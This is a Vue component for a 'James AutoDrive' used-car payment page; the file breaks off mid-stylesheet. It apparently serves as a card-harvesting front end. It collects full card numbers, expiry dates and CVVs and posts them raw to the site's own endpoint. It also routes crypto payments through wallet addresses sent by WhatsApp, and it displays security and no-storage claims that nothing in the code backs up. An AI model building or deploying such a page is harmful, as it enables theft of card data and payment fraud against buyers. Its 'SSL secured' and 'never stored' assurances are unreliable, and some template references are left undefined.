<template>
  <div class="app">

    <!-- ═══════════════════════════════
         LANDING
    ═══════════════════════════════ -->
    <template v-if="view === 'landing'">

      <!-- ── Top Bar ── -->
      <div class="topbar">
        <div class="wrap topbar__inner">
          <span class="topbar__contact">📞 +353 87 123 4567 &nbsp;|&nbsp; ✉ jamesautodrive8@gmail.com</span>
          <span class="topbar__location">📍 Limerick, Ireland &nbsp;·&nbsp; Liverpool, UK</span>
        </div>
      </div>

      <!-- ── Header ── -->
      <header class="header" :class="{ scrolled: scrolled }">
        <div class="wrap header__inner">
          <div class="logo">
            <img src="/images/logo-brand.jpg" alt="" class="logo__img" />
            <div class="logo__text">
              <span class="logo__name">JAMES</span>
              <span class="logo__sub">AUTODRIVE</span>
            </div>
          </div>

          <nav class="nav">
            <a class="nav__link" :class="{ 'nav__link--active': activeSection==='home' }"
               href="#home" @click.prevent="scrollTo('home')">Home</a>
            <a class="nav__link" :class="{ 'nav__link--active': activeSection==='available-cars' }"
               href="#available-cars" @click.prevent="scrollTo('available-cars')">Available Cars</a>
            <a class="nav__link" :class="{ 'nav__link--active': activeSection==='financing' }"
               href="#financing" @click.prevent="scrollTo('financing')">Financing</a>
            <a class="nav__link" :class="{ 'nav__link--active': activeSection==='payments' }"
               href="#payments" @click.prevent="scrollTo('payments')">Payments</a>
            <a class="nav__link" :class="{ 'nav__link--active': activeSection==='about' }"
               href="#about" @click.prevent="scrollTo('about')">About Us</a>
            <a class="nav__link" :class="{ 'nav__link--active': activeSection==='contact' }"
               href="#contact" @click.prevent="scrollTo('contact')">Contact</a>
          </nav>

          <button class="burger" :class="{ open: menuOpen }" @click="menuOpen = !menuOpen" aria-label="Menu">
            <span></span><span></span><span></span>
          </button>
        </div>
        <Transition name="drawer">
          <nav v-if="menuOpen" class="drawer">
            <a class="drawer__link" :class="{ 'drawer__link--active': activeSection==='home' }"
               href="#home" @click.prevent="scrollTo('home'); menuOpen=false">Home</a>
            <a class="drawer__link" :class="{ 'drawer__link--active': activeSection==='available-cars' }"
               href="#available-cars" @click.prevent="scrollTo('available-cars'); menuOpen=false">Available Cars</a>
            <a class="drawer__link" :class="{ 'drawer__link--active': activeSection==='financing' }"
               href="#financing" @click.prevent="scrollTo('financing'); menuOpen=false">Financing</a>
            <a class="drawer__link" :class="{ 'drawer__link--active': activeSection==='payments' }"
               href="#payments" @click.prevent="scrollTo('payments'); menuOpen=false">Payments</a>
            <a class="drawer__link" :class="{ 'drawer__link--active': activeSection==='about' }"
               href="#about" @click.prevent="scrollTo('about'); menuOpen=false">About Us</a>
            <a class="drawer__link" :class="{ 'drawer__link--active': activeSection==='contact' }"
               href="#contact" @click.prevent="scrollTo('contact'); menuOpen=false">Contact</a>
          </nav>
        </Transition>
      </header>

      <!-- ── Hero ── -->
      <section id="home" class="hero">
        <div class="hero__slides">
          <div v-for="(img,i) in heroImgs" :key="i" class="hero__slide"
               :style="{ backgroundImage:`url(${img})`, opacity: activeSlide===i ? 1 : 0 }"></div>
        </div>
        <div class="hero__gradient"></div>

        <div class="wrap hero__content">
          <Transition name="hfade" mode="out-in">
            <div :key="activeSlide" class="hero__text">
              <p class="hero__badge">🚗 Secure Online Payment Portal</p>
              <h1 class="hero__title">SECURE<br/><span class="hero__title--blue">PAYMENT</span><br/>GATEWAY</h1>
              <p class="hero__subtitle">Finance Available &nbsp;•&nbsp; Nationwide Delivery</p>
              <p class="hero__desc">Pay for your vehicle safely and securely online. All major cards and cryptocurrency accepted.</p>
              <div class="hero__btns">
                <button class="btn btn--blue" @click="startPayment('card')">
                  <span class="btn__ico">💳</span> Pay by Card
                </button>
                <button class="btn btn--outline" @click="startPayment('crypto')">
                  <span class="btn__ico">₿</span> Pay with Crypto
                </button>
              </div>
            </div>
          </Transition>
        </div>

        <div class="hero__dots">
          <button v-for="i in 3" :key="i" :class="{ active: activeSlide===i-1 }" @click="goToSlide(i-1)"></button>
        </div>
      </section>

      <!-- ── Welcome back ── -->
      <Transition name="slidedown">
        <div v-if="returningUser" class="welcome-bar">
          <div class="wrap welcome-bar__inner">
            <span>👋 Welcome back, <strong>{{ savedProfile.full_name.split(' ')[0] }}</strong>! Your details are pre-filled for faster checkout.</span>
            <button @click="returningUser=false">✕</button>
          </div>
        </div>
      </Transition>

      <!-- ── Features Bar ── -->
      <div class="features-bar">
        <div class="wrap features-bar__grid">
          <div class="feat">
            <span class="feat__ico">🚗</span>
            <div>
              <p class="feat__title">Automatic Cars Only</p>
              <p class="feat__sub">Smooth. Easy. Reliable.</p>
            </div>
          </div>
          <div class="feat">
            <span class="feat__ico">🚚</span>
            <div>
              <p class="feat__title">Nationwide Delivery</p>
              <p class="feat__sub">We deliver to your door</p>
            </div>
          </div>
          <div class="feat">
            <span class="feat__ico">💰</span>
            <div>
              <p class="feat__title">Finance Available</p>
              <p class="feat__sub">Flexible payment plans</p>
            </div>
          </div>
          <div class="feat">
            <span class="feat__ico">🔒</span>
            <div>
              <p class="feat__title">Secure Payments</p>
              <p class="feat__sub">Card &amp; Crypto Accepted</p>
            </div>
          </div>
        </div>
      </div>

      <!-- ── Happy Customers ── -->
      <section id="available-cars" class="customers-section">
        <div class="wrap">
          <div class="sec-head">
            <h2 class="sec-head__title">HAPPY CUSTOMERS</h2>
            <div class="sec-head__bar"></div>
          </div>
          <div class="customers-scroll">
            <div class="customer-thumb" v-for="img in customerImgs" :key="img"
                 :style="{ backgroundImage:`url(${img})` }"></div>
          </div>
        </div>
      </section>

      <!-- ── Secure Payments Section ── -->
      <section class="payments-section">
        <div class="wrap">
          <div class="sec-head">
            <h2 class="sec-head__title">SECURE PAYMENTS</h2>
            <div class="sec-head__bar"></div>
            <p class="sec-head__sub">Choose your preferred payment method</p>
          </div>

          <div class="pay-grid">
            <!-- Card -->
            <div class="pay-card" @click="startPayment('card')">
              <div class="pay-card__img-wrap">
                <img src="/images/pay-card.jpg" alt="Pay by Card" class="pay-card__img" />
              </div>
              <div class="pay-card__body">
                <h3 class="pay-card__title">PAY BY CARD</h3>
                <p class="pay-card__sub">We accept all major debit and credit cards</p>
                <div class="pay-card__brands">
                  <span class="brand brand--visa">VISA</span>
                  <span class="brand brand--mc">MC</span>
                  <span class="brand brand--amex">AMEX</span>
                  <span class="brand brand--maestro">MAESTRO</span>
                </div>
                <button class="btn btn--blue btn--full">PAY BY CARD</button>
              </div>
            </div>

            <!-- Crypto -->
            <div class="pay-card" @click="startPayment('crypto')">
              <div class="pay-card__img-wrap">
                <img src="/images/pay-crypto.jpg" alt="Pay with Crypto" class="pay-card__img" />
              </div>
              <div class="pay-card__body">
                <h3 class="pay-card__title">PAY WITH CRYPTOCURRENCY</h3>
                <p class="pay-card__sub">Fast, secure and global payments</p>
                <div class="pay-card__brands">
                  <span class="brand brand--btc">BTC</span>
                  <span class="brand brand--eth">ETH</span>
                  <span class="brand brand--ltc">LTC</span>
                  <span class="brand brand--usdt">USDT</span>
                </div>
                <button class="btn btn--blue btn--full">PAY WITH CRYPTO</button>
              </div>
            </div>
          </div>

          <!-- Trust badges -->
          <div class="trust-row">
            <div class="trust-item">
              <span class="trust-item__ico">🔒</span>
              <p class="trust-item__title">100% Secure Transactions</p>
              <p class="trust-item__sub">SSL Encrypted</p>
            </div>
            <div class="trust-item">
              <span class="trust-item__ico">⚡</span>
              <p class="trust-item__title">Instant Payment Confirmation</p>
              <p class="trust-item__sub">Receive receipt immediately</p>
            </div>
            <div class="trust-item">
              <span class="trust-item__ico">👁️</span>
              <p class="trust-item__title">No Hidden Charges</p>
              <p class="trust-item__sub">What you see is what you pay</p>
            </div>
            <div class="trust-item">
              <span class="trust-item__ico">🛡️</span>
              <p class="trust-item__title">Trusted &amp; Reliable</p>
              <p class="trust-item__sub">Your security is our priority</p>
            </div>
          </div>
        </div>
      </section>

      <!-- ── Why Choose + Contact ── -->
      <section class="about-section">
        <div class="wrap about-section__grid">
          <div class="about-why">
            <h3 class="about-why__title">WHY CHOOSE JAMES AUTODRIVE?</h3>
            <ul class="about-why__list">
              <li>✔ Specialists in Automatic Used Cars</li>
              <li>✔ Affordable Prices &amp; Great Value</li>
              <li>✔ Nationwide Delivery Across Ireland</li>
              <li>✔ Flexible Finance Options</li>
              <li>✔ Secure Payments – Card &amp; Crypto</li>
              <li>✔ Excellent Customer Support</li>
            </ul>
          </div>
          <div class="about-car">
            <img src="/images/hero-3.jpg" alt="James AutoDrive Car" class="about-car__img" />
          </div>
          <div class="about-contact">
            <h3 class="about-contact__title">CONTACT US</h3>
            <div class="contact-item"><span>📞</span><span>+353 87 123 4567</span></div>
            <div class="contact-item"><span>✉️</span><span>jamesautodrive8@gmail.com</span></div>
            <div class="contact-item"><span>📍</span><span>Limerick City, Ireland</span></div>
            <div class="contact-item"><span>📍</span><span>Liverpool, UK</span></div>
            <div class="contact-item"><span>🟢</span><span>Nationwide Delivery Available</span></div>
            <button class="btn btn--whatsapp">💬 Chat on WhatsApp</button>
          </div>
        </div>
      </section>

      <!-- ── Finance Banner ── -->
      <section class="finance-banner">
        <div class="wrap finance-banner__inner">
          <div class="finance-banner__left">
            <span class="finance-banner__ico">💰</span>
            <div>
              <h3 class="finance-banner__title">FINANCING MADE EASY</h3>
              <p class="finance-banner__sub">We offer flexible finance options to suit your budget. Quick approval process and competitive rates.</p>
            </div>
          </div>
          <button class="btn btn--outline-light finance-banner__btn">APPLY FOR FINANCE →</button>
        </div>
      </section>

      <!-- ── CTA ── -->
      <section class="cta-banner">
        <div class="wrap cta-banner__inner">
          <div>
            <h2 class="cta-banner__title">FIND YOUR PERFECT AUTOMATIC CAR TODAY</h2>
            <p class="cta-banner__sub">Quality. Affordability. Reliability.</p>
          </div>
          <button class="btn btn--blue cta-banner__btn">🚗 VIEW AVAILABLE CARS</button>
        </div>
      </section>

      <!-- ── Footer ── -->
      <footer class="footer">
        <div class="wrap footer__grid">
          <div class="footer__brand">
            <div class="footer__logo">
              <img src="/images/logo-brand.jpg" alt="" class="footer__logo-img" />
              <div>
                <span class="footer__logo-name">JAMES</span>
                <span class="footer__logo-sub">AUTODRIVE</span>
              </div>
            </div>
            <p class="footer__desc">Providing quality automatic used cars with finance options and nationwide delivery across Ireland.</p>
          </div>
          <div class="footer__col">
            <h4 class="footer__heading">QUICK LINKS</h4>
            <a href="#" class="footer__link">Home</a>
            <a href="#" class="footer__link">Available Cars</a>
            <a href="#" class="footer__link">Financing</a>
            <a href="#" class="footer__link">Payments</a>
            <a href="#" class="footer__link">About Us</a>
            <a href="#" class="footer__link">Contact</a>
          </div>
          <div class="footer__col">
            <h4 class="footer__heading">OUR SERVICES</h4>
            <a href="#" class="footer__link">Automatic Cars</a>
            <a href="#" class="footer__link">Finance Options</a>
            <a href="#" class="footer__link">Nationwide Delivery</a>
            <a href="#" class="footer__link">Card Payments</a>
            <a href="#" class="footer__link">Crypto Payments</a>
          </div>
          <div class="footer__col">
            <h4 class="footer__heading">CONTACT INFO</h4>
            <p class="footer__contact">📞 +353 87 123 4567</p>
            <p class="footer__contact">✉️ jamesautodrive8@gmail.com</p>
            <p class="footer__contact">📍 Limerick, Ireland</p>
            <p class="footer__contact">🕐 Mon – Sat: 9:00 AM – 6:00 PM</p>
          </div>
          <div class="footer__col">
            <h4 class="footer__heading">FOLLOW US</h4>
            <div class="footer__socials">
              <a href="#" class="footer__soc footer__soc--fb">f</a>
              <a href="#" class="footer__soc footer__soc--ig">◎</a>
              <a href="#" class="footer__soc footer__soc--wa">w</a>
              <a href="#" class="footer__soc footer__soc--yt">▶</a>
            </div>
          </div>
        </div>
        <div class="footer__bottom">
          <div class="wrap footer__bottom-inner">
            <p>© 2025 James AutoDrive. All Rights Reserved.</p>
            <p>Website by James AutoDrive</p>
          </div>
        </div>
      </footer>

    </template>

    <!-- ═══════════════════════════════
         CARD PAYMENT FORM
    ═══════════════════════════════ -->
    <template v-else-if="view === 'card'">

      <header class="form-header">
        <div class="wrap form-header__inner">
          <button class="form-header__back" @click="view='landing'">← Back</button>
          <div class="form-header__logo">
            <img src="/images/logo-brand.jpg" alt="" class="form-header__img" />
            <div>
              <span class="form-header__name">JAMES</span>
              <span class="form-header__sub">AUTODRIVE</span>
            </div>
          </div>
          <span class="ssl-badge">🔒 SSL Secured</span>
        </div>
      </header>

      <div class="form-notice">
        <div class="wrap form-notice__inner">
          <span>💾</span>
          <span>Your contact details will be <strong>saved securely</strong> for a faster checkout next time.</span>
        </div>
      </div>

      <!-- Card preview -->
      <div class="card-preview-section">
        <div class="wrap">
          <CardPreview
            :card-number="form.card_number"
            :holder="form.card_holder.toUpperCase()"
            :expiry="form.expiry"
            :cvv="form.cvv"
            :show-back="cvvFocused"
          />
        </div>
      </div>

      <div class="wrap form-wrap">
        <div class="amount-pill">
          <span class="amount-pill__label">Total Payment Amount</span>
          <span class="amount-pill__value">£{{ amountDisplay }}</span>
        </div>

        <form @submit.prevent="handleSubmit" novalidate>

          <div class="form-section-title">Personal Details</div>

          <div class="fgroup" :class="{ error: errors.full_name }">
            <label>Full Name</label>
            <div class="finput-wrap">
              <span class="finput-ico">👤</span>
              <input v-model="form.full_name" type="text" placeholder="John Smith" autocomplete="name" />
            </div>
            <p v-if="errors.full_name" class="ferr">{{ errors.full_name[0] }}</p>
          </div>

          <div class="fgroup" :class="{ error: errors.email }">
            <label>Email Address</label>
            <div class="finput-wrap">
              <span class="finput-ico">✉️</span>
              <input v-model="form.email" type="email" placeholder="john@example.com" autocomplete="email" />
            </div>
            <p v-if="errors.email" class="ferr">{{ errors.email[0] }}</p>
          </div>

          <div class="fgroup" :class="{ error: errors.phone }">
            <label>Phone Number</label>
            <div class="finput-wrap">
              <span class="finput-ico">📞</span>
              <input v-model="form.phone" type="tel" placeholder="+353 / +44 …" autocomplete="tel" />
            </div>
            <p v-if="errors.phone" class="ferr">{{ errors.phone[0] }}</p>
          </div>

          <div class="fgroup" :class="{ error: errors.amount }">
            <label>Payment Amount (£)</label>
            <div class="finput-wrap">
              <span class="finput-ico">💷</span>
              <input v-model="form.amount" type="number" placeholder="0.00" min="1" step="0.01" />
            </div>
            <p v-if="errors.amount" class="ferr">{{ errors.amount[0] }}</p>
          </div>

          <div class="form-section-title" style="margin-top:24px;">Card Details</div>

          <div class="fgroup" :class="{ error: errors.card_holder }">
            <label>Name on Card</label>
            <div class="finput-wrap">
              <span class="finput-ico">💳</span>
              <input v-model="form.card_holder" type="text" placeholder="As it appears on card" autocomplete="cc-name" />
            </div>
            <p v-if="errors.card_holder" class="ferr">{{ errors.card_holder[0] }}</p>
          </div>

          <div class="fgroup" :class="{ error: errors.card_number }">
            <label>Card Number</label>
            <div class="finput-wrap">
              <span class="finput-ico">🔢</span>
              <input :value="form.card_number" @input="fmtCard" type="text"
                     placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" autocomplete="cc-number" />
            </div>
            <p v-if="errors.card_number" class="ferr">{{ errors.card_number[0] }}</p>
          </div>

          <div class="frow">
            <div class="fgroup" :class="{ error: errors.expiry }">
              <label>Expiry Date</label>
              <div class="finput-wrap">
                <span class="finput-ico">📅</span>
                <input :value="form.expiry" @input="fmtExpiry" type="text"
                       placeholder="MM/YY" maxlength="5" inputmode="numeric" autocomplete="cc-exp" />
              </div>
              <p v-if="errors.expiry" class="ferr">{{ errors.expiry[0] }}</p>
            </div>
            <div class="fgroup" :class="{ error: errors.cvv }">
              <label>CVV / CVC</label>
              <div class="finput-wrap">
                <span class="finput-ico">🔐</span>
                <input v-model="form.cvv"
                       @focus="cvvFocused=true" @blur="cvvFocused=false"
                       @input="form.cvv=form.cvv.replace(/\D/g,'').slice(0,4)"
                       type="text" placeholder="•••" maxlength="4" inputmode="numeric" autocomplete="cc-csc" />
              </div>
              <p v-if="errors.cvv" class="ferr">{{ errors.cvv[0] }}</p>
            </div>
          </div>

          <div class="fgroup">
            <label>Car / Order Reference <span class="optional">(optional)</span></label>
            <div class="finput-wrap">
              <span class="finput-ico">🚗</span>
              <input v-model="form.reference" type="text" placeholder="e.g. Toyota Corolla – REF#001" />
            </div>
          </div>

          <label class="save-toggle">
            <input type="checkbox" v-model="form.saveDetails" />
            <span>💾 Save my details for faster checkout next time</span>
          </label>

          <button type="submit" class="btn btn--blue btn--pay" :disabled="loading">
            <span v-if="!loading">🔒 &nbsp;Pay Now — £{{ amountDisplay }}</span>
            <span v-else class="spinner"></span>
          </button>

          <div class="accepted-cards">
            <span>VISA</span><span>MASTERCARD</span><span>AMEX</span><span>MAESTRO</span>
          </div>
        </form>
      </div>

    </template>

    <!-- ═══════════════════════════════
         CRYPTO PAYMENT FORM
    ═══════════════════════════════ -->
    <template v-else-if="view === 'crypto'">

      <header class="form-header">
        <div class="wrap form-header__inner">
          <button class="form-header__back" @click="view='landing'">← Back</button>
          <div class="form-header__logo">
            <img src="/images/logo-brand.jpg" alt="" class="form-header__img" />
            <div>
              <span class="form-header__name">JAMES</span>
              <span class="form-header__sub">AUTODRIVE</span>
            </div>
          </div>
          <span class="ssl-badge">🔒 SSL Secured</span>
        </div>
      </header>

      <div class="form-notice">
        <div class="wrap form-notice__inner">
          <span>💾</span>
          <span>Your contact details will be <strong>saved securely</strong> for a faster checkout next time.</span>
        </div>
      </div>

      <div class="crypto-hero">
        <img src="/images/pay-crypto.jpg" alt="Crypto Payment" class="crypto-hero__img" />
        <div class="crypto-hero__overlay">
          <div class="wrap">
            <p class="crypto-hero__symbol">₿</p>
            <h2 class="crypto-hero__title">CRYPTOCURRENCY PAYMENT</h2>
            <p class="crypto-hero__sub">Fast · Secure · Global</p>
          </div>
        </div>
      </div>

      <div class="wrap form-wrap">
        <div class="crypto-coins">
          <div class="crypto-coin">₿<br/><span>Bitcoin</span></div>
          <div class="crypto-coin">Ξ<br/><span>Ethereum</span></div>
          <div class="crypto-coin">Ł<br/><span>Litecoin</span></div>
          <div class="crypto-coin">₮<br/><span>Tether</span></div>
        </div>

        <form @submit.prevent="handleSubmit" novalidate>

          <div class="form-section-title">Your Details</div>

          <div class="fgroup" :class="{ error: errors.full_name }">
            <label>Full Name</label>
            <div class="finput-wrap">
              <span class="finput-ico">👤</span>
              <input v-model="form.full_name" type="text" placeholder="John Smith" autocomplete="name" />
            </div>
            <p v-if="errors.full_name" class="ferr">{{ errors.full_name[0] }}</p>
          </div>

          <div class="fgroup" :class="{ error: errors.email }">
            <label>Email Address</label>
            <div class="finput-wrap">
              <span class="finput-ico">✉️</span>
              <input v-model="form.email" type="email" placeholder="john@example.com" />
            </div>
            <p v-if="errors.email" class="ferr">{{ errors.email[0] }}</p>
          </div>

          <div class="fgroup" :class="{ error: errors.phone }">
            <label>Phone Number</label>
            <div class="finput-wrap">
              <span class="finput-ico">📞</span>
              <input v-model="form.phone" type="tel" placeholder="+353 / +44 …" />
            </div>
            <p v-if="errors.phone" class="ferr">{{ errors.phone[0] }}</p>
          </div>

          <div class="fgroup" :class="{ error: errors.amount }">
            <label>Amount (£)</label>
            <div class="finput-wrap">
              <span class="finput-ico">💷</span>
              <input v-model="form.amount" type="number" placeholder="0.00" min="1" step="0.01" />
            </div>
            <p v-if="errors.amount" class="ferr">{{ errors.amount[0] }}</p>
          </div>

          <div class="fgroup">
            <label>Order Reference <span class="optional">(optional)</span></label>
            <div class="finput-wrap">
              <span class="finput-ico">🚗</span>
              <input v-model="form.reference" type="text" placeholder="e.g. Audi RS3 – REF#002" />
            </div>
          </div>

          <div class="crypto-note">
            📧 After submitting, our team will contact you via WhatsApp or email with the crypto wallet address and payment instructions within 30 minutes.
          </div>

          <label class="save-toggle">
            <input type="checkbox" v-model="form.saveDetails" />
            <span>💾 Save my details for faster checkout next time</span>
          </label>

          <button type="submit" class="btn btn--blue btn--pay" :disabled="loading">
            <span v-if="!loading">Submit Crypto Request →</span>
            <span v-else class="spinner"></span>
          </button>
        </form>
      </div>

    </template>

    <!-- ═══════════ CONSENT BANNER ═══════════ -->
    <Transition name="slideup">
      <div v-if="showConsent" class="consent-bar">
        <div class="wrap consent-bar__inner">
          <div class="consent-bar__text">
            <span>🔒</span>
            <p>James AutoDrive saves your <strong>name, email &amp; phone</strong> after payment for faster future checkouts. Card numbers are <em>never stored</em>.</p>
          </div>
          <div class="consent-bar__btns">
            <button class="btn btn--blue" @click="acceptConsent">Accept &amp; Continue</button>
            <button class="consent-bar__decline" @click="declineConsent">No thanks</button>
          </div>
        </div>
      </div>
    </Transition>

    <!-- ═══════════ SUCCESS OVERLAY ═══════════ -->
    <Transition name="fade">
      <div v-if="success" class="modal-overlay">
        <div class="modal">
          <div class="modal__logo">
            <img src="/images/logo-brand.jpg" alt="James AutoDrive" />
            <div>
              <span class="modal__logo-name">JAMES</span>
              <span class="modal__logo-sub">AUTODRIVE</span>
            </div>
          </div>
          <div class="modal__check">✓</div>
          <h2 class="modal__title">Payment Submitted!</h2>
          <p class="modal__msg">Thank you, <strong>{{ submittedName }}</strong>. Your payment details have been received and our team will confirm shortly.</p>
          <div class="modal__ref">
            <span class="modal__ref-label">Reference Number</span>
            <span class="modal__ref-num">{{ refNumber }}</span>
          </div>
          <div class="modal__saved">
            <span>💾</span>
            <div>
              <p class="modal__saved-title">Details Saved!</p>
              <p class="modal__saved-body">Your name, email &amp; phone are saved for a faster next checkout.</p>
            </div>
          </div>
          <button class="btn btn--blue btn--full" @click="closeSuccess">Close</button>
        </div>
      </div>
    </Transition>

    <!-- Toast -->
    <Transition name="toast">
      <div v-if="toast.show" class="toast" :class="'toast--'+toast.type">
        {{ toast.type === 'success' ? '✅' : '❌' }} {{ toast.msg }}
      </div>
    </Transition>

  </div>
</template>

<script setup>
import { ref, computed, onMounted, onUnmounted } from 'vue'
import axios from 'axios'
import CardPreview from './CardPreview.vue'

const view     = ref('landing')
const menuOpen = ref(false)
const scrolled = ref(false)

// Carousel
const heroImgs   = ['/images/hero-1.jpg', '/images/hero-2.jpg', '/images/logo-brand.jpg']
const customerImgs = ['/images/hero-1.jpg', '/images/hero-2.jpg', '/images/hero-3.jpg', '/images/family.jpg', '/images/hero-1.jpg', '/images/hero-2.jpg']
const heroSubs   = [
  'Quality Cars. Fair Prices. Delivered Nationwide across the UK and Ireland.',
  'Trusted by hundreds of happy customers. Liverpool & Limerick.',
  'Automatic used cars delivered to your door. Pay securely online today.',
]
const activeSlide = ref(0)
let timer = null
function goToSlide(i) { activeSlide.value = i; resetTimer() }
function resetTimer() {
  clearInterval(timer)
  timer = setInterval(() => { activeSlide.value = (activeSlide.value + 1) % 3 }, 5000)
}

// Profile
const returningUser = ref(false)
const savedProfile  = ref({ full_name:'', email:'', phone:'' })
const showConsent   = ref(false)
function loadProfile() {
  const c = localStorage.getItem('jad_consent')
  const p = localStorage.getItem('jad_profile')
  if (c === 'accepted' && p) { try { savedProfile.value = JSON.parse(p); returningUser.value = true } catch {} }
  if (!c) setTimeout(() => { showConsent.value = true }, 2500)
}
function acceptConsent() { localStorage.setItem('jad_consent','accepted'); showConsent.value = false }
function declineConsent() { localStorage.setItem('jad_consent','declined'); showConsent.value = false }

// Form
const loading       = ref(false)
const success       = ref(false)
const refNumber     = ref('')
const submittedName = ref('')
const errors        = ref({})
const cvvFocused    = ref(false)
const form = ref({
  full_name:'', email:'', phone:'', amount:'',
  card_holder:'', card_number:'', expiry:'', cvv:'',
  reference:'', saveDetails:true, payment_method:'card'
})

const amountDisplay = computed(() => {
  const v = parseFloat(form.value.amount)
  return isNaN(v) ? '0.00' : v.toFixed(2)
})

function startPayment(method) {
  form.value.payment_method = method
  if (savedProfile.value.full_name) {
    form.value.full_name = savedProfile.value.full_name
    form.value.email     = savedProfile.value.email
    form.value.phone     = savedProfile.value.phone
  }
  errors.value = {}
  view.value   = method
  window.scrollTo({ top: 0 })
}

function fmtCard(e) {
  const r = e.target.value.replace(/\D/g,'').slice(0,16)
  form.value.card_number = r.replace(/(.{4})/g,'$1 ').trim()
}
function fmtExpiry(e) {
  let r = e.target.value.replace(/\D/g,'').slice(0,4)
  if (r.length >= 3) r = r.slice(0,2)+'/'+r.slice(2)
  form.value.expiry = r
}

const toast = ref({ show:false, msg:'', type:'success' })
let toastTimer = null
function showToast(msg, type='success') {
  toast.value = { show:true, msg, type }
  clearTimeout(toastTimer)
  toastTimer = setTimeout(() => { toast.value.show = false }, 4000)
}

async function handleSubmit() {
  errors.value = {}; loading.value = true
  const method = form.value.payment_method
  try {
    const payload = {
      full_name: form.value.full_name, email: form.value.email,
      phone: form.value.phone, amount: form.value.amount,
      payment_method: method, reference: form.value.reference,
    }
    if (method === 'card') {
      payload.card_holder = form.value.card_holder
      payload.card_number = form.value.card_number.replace(/\s/g,'')
      payload.expiry      = form.value.expiry
      payload.cvv         = form.value.cvv
    }
    const res = await axios.post('/api/payment', payload)
    refNumber.value    = res.data.ref_number
    submittedName.value = form.value.full_name
    if (form.value.saveDetails && localStorage.getItem('jad_consent') !== 'declined') {
      localStorage.setItem('jad_consent','accepted')
      localStorage.setItem('jad_profile', JSON.stringify({
        full_name: form.value.full_name, email: form.value.email, phone: form.value.phone
      }))
    }
    success.value = true
    form.value = { full_name:'', email:'', phone:'', amount:'', card_holder:'', card_number:'', expiry:'', cvv:'', reference:'', saveDetails:true, payment_method:'card' }
  } catch (err) {
    if (err.response?.status === 422) { errors.value = err.response.data.errors; showToast('Please fix the highlighted fields.','error') }
    else showToast('Submission failed. Please call us directly.','error')
  } finally { loading.value = false }
}

function closeSuccess() { success.value = false; view.value = 'landing'; loadProfile() }

onMounted(() => { loadProfile(); resetTimer(); window.addEventListener('scroll', () => { scrolled.value = window.scrollY > 40 }) })
onUnmounted(() => clearInterval(timer))
</script>

<style scoped>
/* ─── Reset & base ─── */
*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

.app {
  font-family: 'Inter', sans-serif;
  background: #fff;
  color: #1a1a2e;
  overflow-x: hidden;
  min-height: 100vh;
}

/* ─── Layout container ─── */
.wrap {
  width: 100%;
  max-width: 1200px;
  margin: 0 auto;
  padding: 0 16px;
}

/* ─── Colors ─── */
:root {
  --blue:      #1d56db;
  --blue-dark: #1243b0;
  --navy:      #0a1628;
  --navy2:     #0d1f38;
  --text:      #1a1a2e;
  --muted:     #6b7280;
  --light:     #f4f6fa;
  --border:    #e2e8f0;
  --white:     #ffffff;
}

/* ─── Buttons ─── */
.btn {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
  padding: 11px 22px;
  border-radius: 6px;
  border: none;
  font-family: 'Montserrat', sans-serif;
  font-size: 13px;
  font-weight: 700;
  letter-spacing: 0.04em;
  cursor: pointer;
  text-decoration: none;
  transition: all 0.22s;
  white-space: nowrap;
}
.btn__ico { font-size: 15px; }
.btn--blue { background: #1d56db; color: #fff; }
.btn--blue:hover { background: #1243b0; transform: translateY(-1px); box-shadow: 0 6px 20px rgba(29,86,219,0.35); }
.btn--outline { background: transparent; color: #fff; border: 2px solid rgba(255,255,255,0.6); }
.btn--outline:hover { background: rgba(255,255,255,0.1); border-color: #fff; }
.btn--outline-light { background: transparent; color: #fff; border: 2px solid rgba(255,255,255,0.4); }
.btn--outline-light:hover { background: rgba(255,255,255,0.12); border-color: #fff; }
.btn--full { width: 100%; }
.btn--pay { width: 100%; padding: 15px; font-size: 15px; margin-top: 4px; box-shadow: 0 4px 16px rgba(29,86,219,0.3); }
.btn--pay:disabled { opacity: 0.65; cursor: not-allowed; }
.btn--pay:not(:disabled):hover { transform: translateY(-2px); box-shadow: 0 8px 24px rgba(29,86,219,0.4); }
.btn--whatsapp { background: #25d366; color: #fff; margin-top: 16px; }
.btn--whatsapp:hover { background: #1db954; }
.spinner {
  width: 20px; height: 20px;
  border: 2px solid rgba(255,255,255,0.3);
  border-top-color: #fff;
  border-radius: 50%;
  animation: spin .7s linear infinite;
}
@keyframes spin { to { transform: rotate(360deg); } }

/* ─── Topbar ─── */
.topbar {
  background: #0a1628;
  padding: 7px 0;
}
.topbar__inner {
  display: flex;
  align-items: center;
  justify-content: space-between;
  flex-wrap: wrap;
  gap: 4px;
  font-size: 12px;
  color: rgba(255,255,255,0.7);
}

/* ─── Header ─── */
.header {
  background: #0d1f38;
  position: sticky;
  top: 0;
  z-index: 200;
  transition: box-shadow 0.3s;
}
.header.scrolled { box-shadow: 0 4px 24px rgba(0,0,0,0.4); }

.header__inner {
  display: flex;
  align-items: center;
  justify-content: space-between;
  height: 62px;
  gap: 16px;
}

.logo { display: flex; align-items: center; gap: 10px; flex-shrink: 0; cursor: pointer; }
.logo__img { width: 40px; height: 40px; border-radius: 50%; object-fit: cover; border: 2px solid #1d56db; }
.logo__text { display: flex; flex-direction: column; line-height: 1; }
.logo__name { font-family: 'Montserrat', sans-serif; font-size: 15px; font-weight: 900; color: #fff; letter-spacing: 0.06em; }
.logo__sub { font-size: 8px; font-weight: 700; color: #1d56db; letter-spacing: 0.2em; margin-top: 2px; }

.nav { display: none; align-items: center; gap: 4px; }
.nav__link {
  font-size: 13px; font-weight: 500;
  color: rgba(255,255,255,0.75);
  text-decoration: none;
  padding: 6px 10px; border-radius: 4px;
  transition: color 0.2s, background 0.2s;
}
.nav__link:hover, .nav__link--active { color: #fff; background: rgba(29,86,219,0.25); }

.burger {
  display: flex; flex-direction: column; gap: 5px;
  width: 34px; height: 34px; padding: 5px;
  background: none; border: none; cursor: pointer;
  flex-shrink: 0;
}
.burger span {
  display: block; height: 2px;
  background: rgba(255,255,255,0.8); border-radius: 2px;
  transition: transform 0.25s, opacity 0.25s;
}
.burger.open span:nth-child(1) { transform: translateY(7px) rotate(45deg); }
.burger.open span:nth-child(2) { opacity: 0; }
.burger.open span:nth-child(3) { transform: translateY(-7px) rotate(-45deg); }

.drawer {
  background: #0a1628;
  border-top: 1px solid rgba(255,255,255,0.06);
}
.drawer__link {
  display: block; padding: 13px 16px;
